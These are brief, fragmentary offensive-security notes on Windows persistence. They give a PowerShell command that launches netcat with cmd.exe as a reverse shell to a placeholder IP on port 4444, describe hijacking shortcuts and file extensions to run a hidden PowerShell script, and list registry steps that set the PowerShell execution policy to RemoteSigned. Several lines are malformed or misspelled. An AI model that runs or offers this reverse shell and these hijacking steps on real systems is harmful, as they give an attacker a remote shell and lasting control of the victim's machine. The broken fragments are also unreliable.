
```PowerShell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe x.x.x.x 4444"
>c:\path\to\exe\in\shortcut
```

Actual shortcut.

powershell /window=style hidden c:\pathtoscript

Hijacking extensions.
You can hijack extensions in the same way with PowerShell then associate the extension with the PowerShell script.


1.  Hold down the **Windows Key**, then press “**R**” to bring up the Run window.
2.  Type “**regedit**“, then select “**OK**“:
3.  Navigate to the following:
    -   **HKEY_LOCAL_Machine**
    -   **SOFTWARE**
    -   **Microsoft**
    -   **PowerShell**
    -   **1**
    -   **Shelllds**
    -   **Microsoft.Powershell**
4.  Right-click the “**Microsoft.PowerShell**” folder, then select “**New**” > “**String value**“.
5.  Type “**ExecutionPolicy**“, then press “**Enter**” to set the string name.
6.  Open “**ExecutionPolicy**“, then type “**RemoteSigned**” in the “**Value data**” field.
7.  Select “**OK**“.


